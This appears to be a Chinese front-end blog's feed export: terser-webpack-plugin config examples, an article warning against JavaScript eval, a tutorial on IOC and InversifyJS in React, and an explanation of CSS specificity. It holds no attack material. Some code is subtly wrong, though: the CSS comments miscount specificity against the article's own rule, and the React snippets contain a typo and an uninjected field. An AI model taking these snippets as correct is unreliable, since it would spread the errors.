<h4 id="Function-lt-node-comment-gt-Boolean-gt"><a href="#Function-lt-node-comment-gt-Boolean-gt" class="headerlink" title="Function&lt;(node, comment) -&gt; Boolean&gt; "></a><code>Function&lt;(node, comment) -&gt; Boolean&gt;</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#Functionnode-comment---Boolean-%EF%BC%83functionnode-comment-----boolean-functionnode-comment---boolean-%EF%BC%83functionnode-comment-----boolean"></a></h4><p>与指定表达式匹配的所有注释将会被剥离到单独的文件中。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: (astNode, comment) &#x3D;&gt; &#123;</span><br><span class="line">          if (&#x2F;@extract&#x2F;i.test(comment.value)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          return false;</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="Object"><a href="#Object" class="headerlink" title="Object "></a><code>Object</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#object"></a></h4><p>允许自定义剥离注释的条件，指定剥离的文件名和标题。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#123;</span><br><span class="line">          condition: &#x2F;^\**!|@preserve|@license|@cc_on&#x2F;i,</span><br><span class="line">          filename: (fileData) &#x3D;&gt; &#123;</span><br><span class="line">            &#x2F;&#x2F; The &quot;fileData&quot; argument contains object with &quot;filename&quot;, &quot;basename&quot;, &quot;query&quot; and &quot;hash&quot;</span><br><span class="line">            return &#96;$&#123;fileData.filename&#125;.LICENSE.txt$&#123;fileData.query&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">          banner: (licenseFile) &#x3D;&gt; &#123;</span><br><span class="line">            return &#96;License information can be found in $&#123;licenseFile&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="condition"><a href="#condition" class="headerlink" title="condition "></a><code>condition</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#condition"></a></h5><p>类型： <code>Boolean|String|RegExp|Function&lt;(node, comment) -&gt; Boolean|Object&gt;</code></p>
<p>自定义需要剥离的注释。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#123;</span><br><span class="line">          condition: &quot;some&quot;,</span><br><span class="line">          filename: (fileData) &#x3D;&gt; &#123;</span><br><span class="line">            &#x2F;&#x2F; The &quot;fileData&quot; argument contains object with &quot;filename&quot;, &quot;basename&quot;, &quot;query&quot; and &quot;hash&quot;</span><br><span class="line">            return &#96;$&#123;fileData.filename&#125;.LICENSE.txt$&#123;fileData.query&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">          banner: (licenseFile) &#x3D;&gt; &#123;</span><br><span class="line">            return &#96;License information can be found in $&#123;licenseFile&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="filename"><a href="#filename" class="headerlink" title="filename "></a><code>filename</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#filename"></a></h5><p>类型： <code>String|Function&lt;(string) -&gt; String&gt;</code> 默认值： <code>[file].LICENSE.txt [query]</code></p>
<p>可用的占位符： <code>[file]</code> ， <code>[query]</code> 和 <code>[filebase]</code> （webpack 5 使用 <code>[base]</code> ）。</p>
<p>剥离出来的注释将被存储到的文件的文件名。 默认是将后缀 <code>.LICENSE.txt</code> 附加到原始文件名。</p>
<blockquote>
<p>⚠️我们强烈建议使用 <code>txt</code> 扩展名。</p>
</blockquote>
<p>使用 <code>js</code> / <code>cjs</code> / <code>mjs</code> 扩展名可能会与现有资源文件冲突，从而导致代码运行出错。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#123;</span><br><span class="line">          condition: &#x2F;^\**!|@preserve|@license|@cc_on&#x2F;i,</span><br><span class="line">          filename: &quot;extracted-comments.js&quot;,</span><br><span class="line">          banner: (licenseFile) &#x3D;&gt; &#123;</span><br><span class="line">            return &#96;License information can be found in $&#123;licenseFile&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="banner"><a href="#banner" class="headerlink" title="banner "></a><code>banner</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#banner"></a></h5><p>类型： <code>Boolean|String|Function&lt;(string) -&gt; String&gt;</code> 默认值： <code>/*! For license information please see $&#123;commentsFile&#125; */</code></p>
<p>指向剥离文件的标语文本将被添加到原始文件的顶部。 可以为 <code>false</code> （无标题）， <code>String</code> 或一个函数：<code>Function&lt;(string) -&gt; String&gt;</code> ，该函数将被使用存储剥离的注释的文件名来调用。 标语内容将被合并到注释中。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#123;</span><br><span class="line">          condition: true,</span><br><span class="line">          filename: (fileData) &#x3D;&gt; &#123;</span><br><span class="line">            &#x2F;&#x2F; The &quot;fileData&quot; argument contains object with &quot;filename&quot;, &quot;basename&quot;, &quot;query&quot; and &quot;hash&quot;</span><br><span class="line">            return &#96;$&#123;fileData.filename&#125;.LICENSE.txt$&#123;fileData.query&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">          banner: (commentsFile) &#x3D;&gt; &#123;</span><br><span class="line">            return &#96;My custom banner about license information $&#123;commentsFile&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="示例"><a href="#示例" class="headerlink" title="示例 "></a>示例 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#examples"></a></h2><h3 id="保留注释"><a href="#保留注释" class="headerlink" title="保留注释 "></a>保留注释 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#preserve-comments"></a></h3><p>剥离所有有效的注释（即 <code>/^\**!|@preserve|@license|@cc_on/i</code> ）并保留 <code>/@license/i</code> 注释。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        terserOptions: &#123;</span><br><span class="line">          format: &#123;</span><br><span class="line">            comments: &#x2F;@license&#x2F;i,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        extractComments: true,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="删除注释"><a href="#删除注释" class="headerlink" title="删除注释 "></a>删除注释 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#remove-comments"></a></h3><p>如果要在构建时去除注释，请使用以下配置：</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        terserOptions: &#123;</span><br><span class="line">          format: &#123;</span><br><span class="line">            comments: false,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        extractComments: false,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="自定义压缩函数"><a href="#自定义压缩函数" class="headerlink" title="自定义压缩函数 "></a>自定义压缩函数 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#custom-minify-function"></a></h3><p>覆盖默认的 minify 函数 - 使用 <code>uglify-js</code> 进行压缩。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        minify: (file, sourceMap) &#x3D;&gt; &#123;</span><br><span class="line">          &#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;mishoo&#x2F;UglifyJS2#minify-options</span><br><span class="line">          const uglifyJsOptions &#x3D; &#123;</span><br><span class="line">            &#x2F;* your &#96;uglify-js&#96; package options *&#x2F;</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">          if (sourceMap) &#123;</span><br><span class="line">            uglifyJsOptions.sourceMap &#x3D; &#123;</span><br><span class="line">              content: sourceMap,</span><br><span class="line">            &#125;;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          return require(&quot;uglify-js&quot;).minify(file, uglifyJsOptions);</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>为什么不要使用 eval</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8eval/</url>
    <content><![CDATA[<p><code>eval</code> 函数会在当前作用域中执行一段 JavaScript 代码字符串。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var foo &#x3D; 1;</span><br><span class="line">function test() &#123;</span><br><span class="line">    var foo &#x3D; 2;</span><br><span class="line">    eval(&#39;foo &#x3D; 3&#39;);</span><br><span class="line">    return foo;</span><br><span class="line">&#125;</span><br><span class="line">test(); &#x2F;&#x2F; 3</span><br><span class="line">foo; &#x2F;&#x2F; 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是 <code>eval</code> 只在被<strong>直接</strong>调用并且调用函数就是 <code>eval</code> 本身时，才在当前作用域中执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var foo &#x3D; 1;</span><br><span class="line">function test() &#123;</span><br><span class="line">    var foo &#x3D; 2;</span><br><span class="line">    var bar &#x3D; eval;</span><br><span class="line">    bar(&#39;foo &#x3D; 3&#39;);</span><br><span class="line">    return foo;</span><br><span class="line">&#125;</span><br><span class="line">test(); &#x2F;&#x2F; 2</span><br><span class="line">foo; &#x2F;&#x2F; 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码等价于在全局作用域中调用 <code>eval</code>，和下面两种写法效果一样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 写法一：直接调用全局作用域下的 foo 变量</span><br><span class="line">var foo &#x3D; 1;</span><br><span class="line">function test() &#123;</span><br><span class="line">    var foo &#x3D; 2;</span><br><span class="line">    window.foo &#x3D; 3;</span><br><span class="line">    return foo;</span><br><span class="line">&#125;</span><br><span class="line">test(); &#x2F;&#x2F; 2</span><br><span class="line">foo; &#x2F;&#x2F; 3</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 写法二：使用 call 函数修改 eval 执行的上下文为全局作用域</span><br><span class="line">var foo &#x3D; 1;</span><br><span class="line">function test() &#123;</span><br><span class="line">    var foo &#x3D; 2;</span><br><span class="line">    eval.call(window, &#39;foo &#x3D; 3&#39;);</span><br><span class="line">    return foo;</span><br><span class="line">&#125;</span><br><span class="line">test(); &#x2F;&#x2F; 2</span><br><span class="line">foo; &#x2F;&#x2F; 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在<strong>任何情况下</strong>我们都应该避免使用 <code>eval</code> 函数。99.9% 使用 <code>eval</code> 的场景都有<strong>不使用</strong> <code>eval</code> 的解决方案。</p>
<h3 id="伪装的-eval"><a href="#伪装的-eval" class="headerlink" title="伪装的 eval"></a>伪装的 <code>eval</code></h3><p>定时函数 <code>setTimeout</code> 和 <code>setInterval</code> 都可以接受字符串作为它们的第一个参数。 这个字符串<strong>总是</strong>在全局作用域中执行，因此 <code>eval</code> 在这种情况下没有被直接调用。</p>
<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p><code>eval</code> 也存在安全问题，因为它会执行<strong>任意</strong>传给它的代码， 在代码字符串未知或者是来自一个不信任的源时，绝对不要使用 <code>eval</code> 函数。</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>绝对不要使用 <code>eval</code>，任何使用它的代码都会在它的工作方式，性能和安全性方面受到质疑。 如果一些情况必须使用到 <code>eval</code> 才能正常工作，首先它的设计会受到质疑，这<strong>不应该</strong>是首选的解决方案， 一个更好的不使用 <code>eval</code> 的解决方案应该得到充分考虑并优先采用。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>使用IOC解耦React组件</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E4%BD%BF%E7%94%A8IOC%E8%A7%A3%E8%80%A6React%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<p><code>IOC</code>（控制反转）是一种编程思想，可以解耦组件，提高组件复用性。</p>
<p>本文包括两部分：</p>
<ol>
<li> 介绍<code>IOC</code>概念</li>
<li> <code>IOC</code>在<code>React</code>中的应用</li>
</ol>
<h2 id="IOC是什么"><a href="#IOC是什么" class="headerlink" title="IOC是什么"></a><strong>IOC是什么</strong></h2><p>让我们来看个例子：</p>
<p>我们有个士兵的类，在类内部会实例化一种武器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Soldier &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    &#x2F;&#x2F; 这里我们实例化一把步枪</span><br><span class="line">    this.weapon &#x3D; new Rifle();</span><br><span class="line">  &#125;</span><br><span class="line">  attack() &#123;</span><br><span class="line">    this.weapon.attack();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>士兵的武器应该是多种多样的，但是在<code>Soldier</code>类内部依赖了<code>Rifle</code>。</p>
<p>所以当我们想将武器从步枪换为手榴弹时，只能这样改写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">constructor() &#123;</span><br><span class="line">  &#x2F;&#x2F; 这里我们实例化一把步枪</span><br><span class="line">  &#x2F;&#x2F; this.weapon &#x3D; new Rifle();</span><br><span class="line">  &#x2F;&#x2F; 这里我们实例化一个手榴弹</span><br><span class="line">  this.weapon &#x3D; new Grenade();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure>

<p>理想的状态是：士兵不依赖具体的武器，弹药库里有什么武器，就用什么武器。</p>
<p>在这种情况下，<code>IOC</code>作为弹药库，就派上了用场。</p>
<p>让我们来改写代码：</p>
<h3 id="第一步：DI（Dependency-Injection）"><a href="#第一步：DI（Dependency-Injection）" class="headerlink" title="第一步：DI（Dependency Injection）"></a><strong>第一步：DI（Dependency Injection）</strong></h3><p>改写的第一步是使士兵不依赖具体的武器，而是将武器作为依赖注入给士兵：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Soldier &#123;</span><br><span class="line">  &#x2F;&#x2F; 将武器作为依赖注入</span><br><span class="line">  constructor(weapon) &#123;</span><br><span class="line">    this.weapon &#x3D; weapon;</span><br><span class="line">  &#125;</span><br><span class="line">  attack() &#123;</span><br><span class="line">    this.weapon.attack();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将武器的实例作为<code>Soldier</code>的参数传入，于是可以如下调用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const s1 &#x3D; new Soldier(new Rifle());</span><br><span class="line">const s2 &#x3D; new Soldier(new Grenade());</span><br></pre></td></tr></table></figure>

<p>这一步被称为<code>DI</code>（依赖注入）。</p>
<h3 id="第二步：IOC容器"><a href="#第二步：IOC容器" class="headerlink" title="第二步：IOC容器"></a><strong>第二步：IOC容器</strong></h3><p>那么武器从哪儿来呢？接下来来打造我们的武器库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Armory &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.weapon &#x3D; null;</span><br><span class="line">  &#125;</span><br><span class="line">  setWeapon(weapon) &#123;</span><br><span class="line">    this.weapon &#x3D; weapon;</span><br><span class="line">  &#125;</span><br><span class="line">  getWeapon() &#123;</span><br><span class="line">    return this.weapon;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>武器库支持存武器(<code>setWeapon</code>)和取武器（<code>getWeapon</code>）。</p>
<p>现在，士兵不依赖具体武器，只需要去武器库取武器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const armory1 &#x3D; new Armory();</span><br><span class="line"></span><br><span class="line">class Soldier &#123;</span><br><span class="line">  &#x2F;&#x2F; 将武器作为依赖注入</span><br><span class="line">  constructor(armory) &#123;</span><br><span class="line">    this.weapon &#x3D; armory.getWeapon();</span><br><span class="line">  &#125;</span><br><span class="line">  attack() &#123;</span><br><span class="line">    this.weapon.attack();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>改造前的依赖关系：</p>
<p><code>士兵 --&gt; 武器</code></p>
<p>改造前原先应用（士兵）拥有依赖的完全控制权。</p>
<p>改造后的依赖关系：</p>
<p><code>士兵 --&gt; 武器库 &lt;-- 武器</code></p>
<p>改造后应用（士兵）与服务提供方（武器）解耦，他们通过<code>IOC</code>容器（武器库）联系。</p>
<p>从<code>Demo</code>也能看出<code>IOC</code>与<code>DI</code>的关系：<code>DI</code>是实现<code>IOC</code>编程思想的一种方式。</p>
<p>除了<code>DI</code>外，另一种实现方式是<code>Dependency Lookup</code>（依赖查找），简称<code>DL</code>。</p>
<h2 id="IOC与React"><a href="#IOC与React" class="headerlink" title="IOC与React"></a><strong>IOC与React</strong></h2><p>在<code>React</code>中，为组件传递的<code>props</code>就是一种<code>DI</code>实现。</p>
<p>为了跨层级传递数据，我们常使用<code>Context API</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Name() &#123;</span><br><span class="line">  const &#123;name&#125; &#x3D; useContext(nameContext);</span><br><span class="line">  reutrn &lt;h1&gt;&#123;name&#125;&lt;&#x2F;h1&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>context</code>将依赖提供方（<code>name</code>）与依赖使用方（<code>Name</code>）隔离，可以看作是一种<code>IOC</code>实现。<br>所以说，合理使用<code>React</code>可以充分利用<code>IOC</code>的思想解耦代码逻辑。<br>接下来我们看看专业的<code>DI</code>库如何与<code>React</code>结合：</p>
<h2 id="InversifyJS"><a href="#InversifyJS" class="headerlink" title="InversifyJS"></a><strong>InversifyJS</strong></h2><p><strong>InversifyJS</strong>[1]是一个强大、轻量的<code>DI</code>库。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-062089aa62c329c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>首先我们实现依赖（武器的实现）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; armory.ts</span><br><span class="line">import &#123; injectable &#125; from &quot;inversify&quot;;</span><br><span class="line"></span><br><span class="line">export interface IArmory&lt;T&gt; &#123;</span><br><span class="line">  attack(): T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@injectable()</span><br><span class="line">export class Armory implements IArmory&lt;string&gt; &#123;</span><br><span class="line">  attack() &#123;</span><br><span class="line">    return &quot;Rifle biubiubiu～&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>inversify</code>提供的<code>injectable decorator</code>标记该<code>class</code>是可被注入的。</p>
<p>接下来实现需求方（士兵的实现）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &quot;react&quot;;</span><br><span class="line">import &#123; IArmory &#125; from &quot;.&#x2F;armory&quot;;</span><br><span class="line"></span><br><span class="line">export class Soldier extends React.Component &#123;</span><br><span class="line">  private readonly Armory: IArmory&lt;string&gt;;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    return &lt;h1 onClick&#x3D;&#123;() &#x3D;&gt; this.armory.attack()&#125;&gt;I am a soldier&lt;&#x2F;h1&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后实例化<code>IOC</code>容器，连接需求方与依赖：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Container &#125; from &quot;inversify&quot;;</span><br><span class="line">import &#123; IArmory, Armory &#125; from &quot;.&#x2F;armory&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 实例化IOC容器</span><br><span class="line">export const container &#x3D; new Container();</span><br><span class="line">&#x2F;&#x2F; 将依赖方注入容器，其中armory为该依赖的ID</span><br><span class="line">container.bind&lt;IArmory&lt;string&gt;&gt;(&quot;armory&quot;).to(Armory);</span><br></pre></td></tr></table></figure>

<p>至此，完成一个<code>React</code>组件的简单<code>IOC</code>。</p>
<p>业务逻辑的更多依赖都可以通过注入IOC容器来实现解耦。</p>
<p><code>Hooks</code>同样可以通过<code>inversify</code>完成<code>IOC</code>，参考<strong>Dependency injection in React using InversifyJS. Now with React Hooks</strong>[2]</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><strong>参考资料</strong></h3><p>[1]<strong><a href="https://github.com/inversify/InversifyJS">InversifyJS</a></strong><br>[2]<strong><a href="https://itnext.io/dependency-injection-in-react-using-inversifyjs-now-with-react-hooks-64f7f077cde6">Dependency injection in React using InversifyJS. Now with React Hooks:</a></strong></p>
<blockquote>
<p>本文分享自微信公众号 - 魔术师卡颂（gh_bc4b6cbdf9ad），作者：卡颂</p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>你必须知道的CSS权重</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E4%BD%A0%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84CSS%E6%9D%83%E9%87%8D/</url>
    <content><![CDATA[<h1 id="层叠"><a href="#层叠" class="headerlink" title="层叠"></a>层叠</h1><p>我们都知道CSS的全称是<code>Cascading Style Sheets</code> 也就是<code>层叠样式表</code></p>
<p>那么当多个选择器同时选中一个元素时 会发生什么呢</p>
<p>这就是CSS需要解决的问题</p>
<ul>
<li><p>  <code>声明冲突</code>：同一个样式，多次应用到同一个元素</p>
</li>
<li><p>  <code>层叠</code>：<code>解决声明冲突的过程</code>，浏览器自动处理（<code>权重计算</code>）</p>
</li>
</ul>
<hr>
<h2 id="1-比较重要性"><a href="#1-比较重要性" class="headerlink" title="1. 比较重要性"></a>1. 比较重要性</h2><p>重要性从高到低：</p>
<ol>
<li><p> 作者样式表中的 <code>!important</code>样式</p>
</li>
<li><p> 作者样式表中的普通样式</p>
</li>
<li><p> 浏览器默认样式表中的样式</p>
</li>
</ol>
<blockquote>
<p>作者样式表：开发者书写的样式</p>
</blockquote>
<hr>
<ul>
<li>  我们知道 class 选择器的权重是高于元素选择器的</li>
</ul>
<p>但当元素选择器的背景样式设置了 <code>!important</code> 时， <code>重要性变得最高</code>，所以优先显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">	&#x2F;&#x2F;元素选择器</span><br><span class="line">       div&#123;</span><br><span class="line">           width : 100px;</span><br><span class="line">           height : 100px;</span><br><span class="line">           background: #008c8c !important; </span><br><span class="line">       &#125;</span><br><span class="line">       &#x2F;&#x2F;class选择器</span><br><span class="line">       .box&#123;</span><br><span class="line">           background: red;</span><br><span class="line">       &#125;</span><br><span class="line">   &lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-f18dace6fd391bd2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li>  浏览器默认样式表就是浏览器赋予元素的默认样式</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5c456121502d0f93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>上图右上角的标志就是浏览器的默认样式</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d022fb5fbae9dec9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>浏览器默认样式可以被我们书写的样式覆盖</p>
<hr>
<h2 id="2-比较特殊性"><a href="#2-比较特殊性" class="headerlink" title="2. 比较特殊性"></a>2. 比较特殊性</h2><p>看选择器的<code>权重</code>：</p>
<ul>
<li><p>  总体规则：选择器选中的范围越窄，权重越大，越特殊</p>
</li>
<li><p>具体规则：通过选择器，计算出一个四位数（x x x x）</p>
<p>  1.千位：如果是内联样式，记1，否则记0 （<code>内联样式权重 ：1000</code>）</p>
<p>  2.百位：等于选择器中所有id选择器的数量 （<code>id选择器权重 ：100</code>）</p>
<p>  3.十位：等于选择器中所有类选择器、属性选择器、伪类选择器的数量 （<code>类选择器、属性选择器、伪类选择器的权重 ：10</code>）</p>
<p>  4.个位：等于元素选择器、伪元素选择器的数量 （ <code>元素、伪元素的权重 ：1</code>）</p>
</li>
</ul>
<blockquote>
<p>计数规则是逢256进一<br>一般情况下 256个class选择器可以干掉一个id选择器</p>
</blockquote>
<hr>
<ul>
<li>  id选择器 &gt; class选择器 显示绿色</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">       background: red;</span><br><span class="line">       &#125;</span><br><span class="line">   #box&#123;</span><br><span class="line">       background: green;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-150316ad111e2bd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li>  class选择器 &gt; 元素选择器 显示红色</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">       width : 100px;</span><br><span class="line">       height : 100px;</span><br><span class="line">       background: #008c8c; </span><br><span class="line">       display : inline-block;</span><br><span class="line">   &#125;</span><br><span class="line">   .box&#123;</span><br><span class="line">       background: red;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-acf09262530ff7bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li>  权重简单计算 ：权重高的优先显示</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;计算四位数：元素选择器有一个十位加1为0010 class选择器有一个百位加1为0110</span><br><span class="line">&#x2F;&#x2F;简单一点 ：div元素选择器权重为10 class选择器为100 加起来就是110</span><br><span class="line">div.box&#123;</span><br><span class="line">       background: red;</span><br><span class="line">   &#125;</span><br><span class="line">   &#x2F;&#x2F;id选择器有一个千位加1为1000</span><br><span class="line">   &#x2F;&#x2F;简单一点 ：id选择器权重为1000</span><br><span class="line">   #box&#123;</span><br><span class="line">       background: green;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-0603442fdf3a2e60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li>  剩下的就不一一列举了</li>
</ul>
<hr>
<h2 id="3-比较源次序"><a href="#3-比较源次序" class="headerlink" title="3. 比较源次序"></a>3. 比较源次序</h2><p><code>代码书写靠后的优先</code></p>
<p>后面的代码会覆盖前面的代码</p>
